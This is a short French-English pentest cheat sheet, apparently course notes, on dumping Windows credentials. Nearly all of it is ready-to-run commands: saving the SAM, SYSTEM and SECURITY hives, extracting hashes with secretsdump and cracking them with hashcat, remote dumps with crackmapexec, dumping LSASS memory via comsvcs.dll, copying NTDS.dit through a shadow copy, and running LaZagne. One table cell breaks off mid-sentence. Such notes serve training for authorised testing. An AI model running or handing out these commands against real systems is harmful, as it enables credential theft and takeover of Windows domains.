# Local Windows

## Password windows

### SAM

| Registry Hive |                                                          Description                                                          |
| ------------- | :---------------------------------------------------------------------------------------------------------------------------: |
| hklm\sam      |                         Contains the hashes associated with local account passwords. We will need the                         |
| hklm\system   | Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database. |
| hklm\security |      Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.      |

Si les droits sont suffisants, il est possible de faire une sauvegarde du registre:

```powershell
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

Puis, après transfert, d'en extraire les différents hashs:

```bash
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

Et enfin, de les cracker:

hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

Il est aussi possible de faire les dumps à distance:

```bash
crackmapexec smb $ip --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

crackmapexec smb $ip --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

### LSASS

Récupérer le pid de LSASS:

```powershell
Get-Process lsass

ou

tasklist /svc
```

Puis faire un dump du process:

```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump $PID C:\lsass.dmp full
```

Transférer le dump puis utiliser pypykatz afin d'en extraire les infos:

```bash
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```

### NTDS

NTDS.dit est la base de données du domaine active directory, il est possible de la dumper et d'en extraire les différentes infos:

En local:

```powershell
vssadmin CREATE SHADOW /For=C:

cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

A distance:

```bash
crackmapexec smb $ip -u $user -p $password --ntds
```

### Recherche password

Mots clefs courants:

|               |              |             |
| :-----------: | :----------: | :---------: |
|   Passwords   |  Passphrases |     Keys    |
|    Username   | User account |    Creds    |
|     Users     |    Passkeys  | Passphrases |
| configuration | dbcredential |  dbpassword |
|      pwd      |     Login    | Credentials |

Lazagne (tool pour chercher des passwords stockés dans des fichiers de config, etc...):

[https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe](https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe)

```powershell
start lazagne.exe all
```
